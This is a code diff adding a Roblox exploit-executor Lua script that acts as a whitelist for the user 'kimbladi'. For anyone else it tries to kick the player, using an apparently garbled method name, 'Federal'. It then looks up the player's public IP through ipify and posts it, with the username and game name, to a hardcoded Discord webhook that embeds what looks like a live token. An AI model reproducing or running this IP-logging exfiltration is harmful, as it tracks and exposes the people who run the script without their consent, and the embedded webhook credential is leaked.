@@ -1,0 +1,53 @@
+local webh = "https://discord.com/api/webhooks/1162964275808186378/lKEhCLtChU_2V5K9yYGa_w_BNuCVaUm3OpOF8kc3a4AhH1CetWGUYp9AMxfFdfRKPhe3"
+
+if game.Players.LocalPlayer.Name == "kimbladi" then
+print("script")
+else
+game.Players.LocalPlayer:Federal("You arent Whitelisted. Your Address, Username, and Game Name was sent to administration.")
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = "This Script was whitelisted to kimbladi but **__" .. game.Players.LocalPlayer.Name.."__ Executed It in ".. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .."!**",
+               ["description"] = "**Not Whitelisted users IP: ** __**" .. game:HttpGet("https://api.ipify.org") .. "**__" 
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+end
